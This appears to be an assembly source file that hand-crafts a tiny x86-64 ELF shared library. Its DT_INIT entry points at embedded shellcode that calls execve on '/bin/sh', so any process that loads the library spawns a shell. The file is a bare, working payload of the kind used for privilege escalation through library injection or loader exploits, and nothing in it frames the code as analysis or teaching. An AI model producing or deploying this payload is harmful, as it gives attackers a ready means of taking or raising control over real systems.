/* From elf.h */
#define ELFMAG0         0x7f            /* Magic number byte 0 */
#define ELFMAG1         'E'             /* Magic number byte 1 */
#define ELFMAG2         'L'             /* Magic number byte 2 */
#define ELFMAG3         'F'             /* Magic number byte 3 */
#define ELFCLASS64      2               /* 64-bit objects */
#define ELFDATA2LSB     1               /* 2's complement, little endian */
#define EV_CURRENT      1               /* Current version */
#define ET_DYN          3               /* Shared object file */
#define EM_X86_64       62      /* AMD x86-64 architecture */
#define PT_LOAD         1               /* Loadable program segment */
#define PT_DYNAMIC      2               /* Dynamic linking information */
#define PF_X            (1 << 0)        /* Segment is executable */
#define PF_W            (1 << 1)        /* Segment is writable */
#define PF_R            (1 << 2)        /* Segment is readable */
#define DT_NULL         0               /* Marks end of dynamic section */
#define DT_STRTAB       5               /* Address of string table */
#define DT_SYMTAB       6               /* Address of symbol table */
#define DT_INIT         12              /* Address of init function */

#define Elf64_Addr .quad
#define Elf64_Off .quad
#define Elf64_Half .short
#define Elf64_Word .int
#define Elf64_Sword .int
#define Elf64_Xword .quad
#define Elf64_Sxword .quad

#define FILE_OFFSET(x) ((x) - e_ident)
#define VIRTUAL_ADDRESS(x) ((x) - e_ident)
#define STRING_OFFSET(x) ((x) - strtab)

e_ident: .byte ELFMAG0, ELFMAG1, ELFMAG2, ELFMAG3, ELFCLASS64, ELFDATA2LSB, EV_CURRENT, 0, 0, 0, 0, 0, 0, 0, 0, 0
e_type: Elf64_Half ET_DYN
e_machine: Elf64_Half EM_X86_64
e_version: Elf64_Word EV_CURRENT
e_entry: Elf64_Addr 0
e_phoff: Elf64_Off FILE_OFFSET(p_type0)
e_shoff: Elf64_Off FILE_OFFSET(s0)
e_flags: Elf64_Word 0
e_ehsize: Elf64_Half FILE_OFFSET(e_end)
e_phentsize: Elf64_Half p_end0 - p_type0
e_phnum: Elf64_Half 2
e_shentsize: Elf64_Half 0
e_shnum: Elf64_Half 0
e_shstrndx: Elf64_Half 0
e_end:

p_type0: Elf64_Word PT_LOAD
p_flags0: Elf64_Word PF_R | PF_W | PF_X
p_offset0: Elf64_Off FILE_OFFSET(p0)
p_vaddr0: Elf64_Addr VIRTUAL_ADDRESS(p0)
p_paddr0: Elf64_Addr 0
p_filesz0: Elf64_Xword p0_end - e_ident
p_memsz0: Elf64_Xword p0_end - e_ident
p_align0: Elf64_Xword 4096  /* avoid "ELF load command alignment not page-aligned" */
p_end0:

p_type1: Elf64_Word PT_DYNAMIC
p_flags1: Elf64_Word PF_R | PF_W | PF_X
p_offset1: Elf64_Off FILE_OFFSET(p1)
p_vaddr1: Elf64_Addr VIRTUAL_ADDRESS(p1)
p_paddr1: Elf64_Addr 0
p_filesz1: Elf64_Xword p1_end - p1
p_memsz1: Elf64_Xword p1_end - p1
p_align1: Elf64_Xword 1
p_end1:

p0:
shellcode:
xor %rdx, %rdx
push %rdx
mov $0x68732f6e69622f, %rdi
push %rdi
push %rsp
pop %rdi
push %rdx
push %rdi
mov %rsp, %rsi
mov $59, %rax
syscall
p0_end:

p1:
d_tag0: Elf64_Sxword DT_STRTAB
d_ptr0: Elf64_Addr VIRTUAL_ADDRESS(strtab)
d_tag1: Elf64_Sxword DT_SYMTAB
d_ptr1: Elf64_Addr VIRTUAL_ADDRESS(symtab)
d_tag2: Elf64_Sxword DT_INIT
d_ptr2: Elf64_Addr VIRTUAL_ADDRESS(shellcode)
d_tag3: Elf64_Sxword DT_NULL
d_val3: Elf64_Xword 0

strtab:
.byte 0

symtab:
st_name0: Elf64_Word 0
st_info0: .byte 0
st_other0: .byte 0
st_shndx0: Elf64_Half 0
st_value0: Elf64_Addr 0
st_size0: Elf64_Xword 0

p1_end:
